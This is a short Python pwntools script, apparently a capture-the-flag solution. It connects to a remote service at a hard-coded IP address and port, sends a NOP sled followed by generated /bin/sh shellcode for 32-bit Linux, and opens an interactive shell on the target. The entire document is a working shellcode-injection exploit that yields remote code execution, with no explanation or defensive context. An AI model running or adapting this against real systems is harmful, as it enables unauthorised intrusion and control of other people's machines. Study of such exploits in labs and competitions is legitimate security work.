from pwn import *

context(arch='i386', os='linux', endian='little', word_size=32)

#io = process('./vuln')  # Replace with the actual binary name
io = remote('34.125.199.248', 1234)
shellcode = asm(shellcraft.sh())

buffer_size = 512  
nop_sled = b'\x90' * (buffer_size - len(shellcode))

payload = nop_sled + shellcode

io.recvuntil("Enter your shellcode:")
io.sendline(payload)  # Send the payload

io.interactive()
